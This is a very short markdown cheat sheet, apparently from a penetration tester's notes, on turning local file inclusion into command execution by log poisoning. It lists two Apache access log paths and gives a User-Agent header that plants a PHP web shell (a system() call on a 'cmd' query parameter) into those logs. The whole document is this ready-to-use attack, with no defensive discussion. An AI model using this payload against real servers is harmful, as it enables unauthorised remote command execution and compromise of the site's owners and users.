# lfi

## check

- /var/log/apache/access.log
- /var/log/apache2/access.log

## set payload via user-agent

```
User-Agent: <?php system($_GET['cmd']);?>
```
